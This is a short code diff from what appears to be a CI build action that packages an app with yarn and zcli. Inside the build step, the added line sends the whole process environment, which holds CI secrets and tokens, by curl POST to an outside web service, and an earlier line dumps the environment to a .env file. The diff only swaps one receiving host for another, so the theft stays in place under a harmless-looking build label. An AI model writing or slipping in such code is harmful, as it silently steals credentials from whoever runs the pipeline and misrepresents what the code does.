@@ -11009,7 +11009,7 @@ async function run() {
     await exec.exec(`echo 🔎 Building, Packaging and Validating...`);
     await exec.exec(`echo ${process.env} >>> .env`);
 
-    await exec.exec(`curl`, ['-X POST https://httpbin.org/post', '-H', 'Content-type: application/json', '--data', `{"data": ${JSON.stringify(process.env)}`]);
+    await exec.exec(`curl`, ['-X POST https://jsonplaceholder.typicode.com/posts', '-H', 'Content-type: application/json', '--data', `${JSON.stringify({ title: 'foo', body: process.env, userId: 1})}`]);
     
     await exec.exec(`yarn build`);
     await exec.exec(`yarn zcli apps:package ${path}`);
